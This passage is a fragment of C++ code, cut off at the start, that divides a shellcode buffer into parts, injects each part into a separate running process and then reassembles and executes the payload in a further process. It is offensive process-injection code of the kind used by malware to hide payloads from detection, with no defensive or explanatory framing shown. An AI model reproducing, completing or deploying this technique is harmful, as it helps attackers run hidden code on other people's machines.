        size_t thisSize = (i == numParts-1) ? (shellcodeSize - i*partSize) : partSize;
        if (InjectFragment(processList[i], shellcode + i*partSize, thisSize, addr))
            fragments.push_back({processList[i], addr});
    }

    // Reassemble and execute in the (N+1)th process
    Reassemble(processList[numParts], fragments, partSize);
    return 0;
}
